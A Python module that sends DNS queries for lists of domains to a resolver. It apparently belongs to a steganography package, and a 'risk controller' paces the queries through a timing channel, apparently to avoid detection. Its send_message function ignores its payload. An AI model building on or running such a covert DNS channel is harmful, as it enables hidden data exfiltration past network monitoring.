"""DNS sender utilities."""
from __future__ import annotations

import socket
from dataclasses import dataclass, field
from typing import Iterable

from ..agents.controller import RiskController
from ..stego.packet_builder import PacketBuilder
from ..stego.timing_channel import TimingChannel
from ..utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class DNSSender:
    server: str = "8.8.8.8"
    port: int = 53
    packet_builder: PacketBuilder = field(default_factory=PacketBuilder)
    controller: RiskController = field(default_factory=RiskController)
    timing_channel: TimingChannel = field(default_factory=TimingChannel)

    def send_domains(self, domains: Iterable[str], risk_window: int = 5) -> None:
        """Send domains to the configured DNS server."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            window: list[str] = []
            for domain in domains:
                packet = self.packet_builder.build_query(domain)
                data = packet.pack()
                sock.sendto(data, (self.server, self.port))
                logger.debug("Sent DNS query for %s", domain)
                window.append(domain)
                if len(window) >= risk_window:
                    risk = self.controller.assess_risk(window)
                    self.timing_channel.sleep(risk)
                    window.clear()
        finally:
            sock.close()

    def send_message(self, payload: bytes, domains: Iterable[str]) -> None:
        logger.info("Sending payload of %d bytes", len(payload))
        self.send_domains(domains)


def send_domains(domains: Iterable[str], server: str = "8.8.8.8", port: int = 53, qtype: str = "A") -> None:
    sender = DNSSender(server=server, port=port, packet_builder=PacketBuilder(qtype=qtype))
    sender.send_domains(domains)


__all__ = ["DNSSender", "send_domains"]
